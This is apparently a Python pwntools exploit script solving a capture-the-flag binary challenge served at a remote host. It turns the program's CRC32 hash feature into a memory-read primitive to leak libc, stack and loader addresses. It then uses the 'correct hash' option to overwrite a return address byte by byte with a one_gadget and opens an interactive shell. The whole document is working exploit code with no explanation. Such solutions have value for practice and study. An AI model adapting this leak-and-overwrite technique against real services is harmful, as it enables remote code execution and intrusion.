#!/usr/bin/env python3



from pwn import *
from subprocess import *
from zlib import *

e = ELF("./ECCCCCC_patched")
#r = process("./ECCCCCC_patched")
r = remote("ECCCCCC.pwn.so",65505)
libc = ELF("./libc.so.6")
def print_crc(begin,length):
    r.sendlineafter(b"Option:",b"1")
    r.sendlineafter(b"Begin",begin)
    r.sendlineafter(b"Length",f"{length}")
    r.recvuntil(b"hash: ")
    leak = int(r.recvline().strip(),16)
    a = subprocess.check_output(["/home/strikerr/Downloads/ctf_tools/crc32/crc32.py","reverse",str(leak)])
    a = a.split(b"\n")
    a = a[0].rstrip(b"}").lstrip(b"4 bytes: {")
    a = a.split(b",")
    i = 0
    val = 0
    while(i<4):
        il_val = int(a[i].strip(),16)
        val+=il_val<<(8*i)
        i+=1
    return val
        
def correct_hash(old_mem,begin,length,correct):
    old_mem = old_mem[:-2] + correct
    j = crc32(struct.pack('<I', int(old_mem, 16)))
    r.sendlineafter(b"Option:",b"2")
    r.sendlineafter(b"Begin",f"{begin}")
    r.sendlineafter(b"Length",f"{length}")
    r.sendlineafter(b"Correct hash:",str(j))


first_half = print_crc(b"403fc0",4)
second_half = print_crc(b"0x403fc4",4)
leak = (second_half << (8*4)) + first_half
libc_base = leak - libc.sym.puts
log.info("The libc leak of the process is " + hex(libc_base))
first_stack_half = print_crc(hex(libc_base + libc.sym.environ).lstrip("0x"),4)
second_stack_half = print_crc(hex(libc_base + libc.sym.environ + 4).lstrip("0x"),4)
stack_leak = (second_stack_half << (8*4)) + first_stack_half
log.info("The stack leak of the process is " + hex(stack_leak))
return_address = stack_leak - 0x100
log.info("The return address of the process is " + hex(return_address))
first_ld_half = print_crc(hex(return_address + 0x8).lstrip("0x"),4)
second_ld_half = print_crc(hex(return_address + 0xc).lstrip("0x"),4)
ld_leak = (second_ld_half << (8*4)) + first_ld_half
log.info("The ld of the process is " + hex(ld_leak))
gadget_val = libc_base + 0xe3b31
main_ret_val = hex(libc_base + libc.sym.__libc_start_main + 243) 
full_val = "0000" + hex(ld_leak).lstrip("0x") + "0000" + main_ret_val.lstrip("0x") 
for i in range(0,6):
    main_ret = full_val[24-(i*2):len(full_val) - (i*2)]
    one_gadget = hex(gadget_val)[len(hex(gadget_val))-(i*2)-2:len(hex(gadget_val)) - (i*2)]
    correct_hash(main_ret,hex(return_address+i).lstrip("0x"),4,one_gadget)
r.sendlineafter(b"Option:",b"3")
r.interactive()
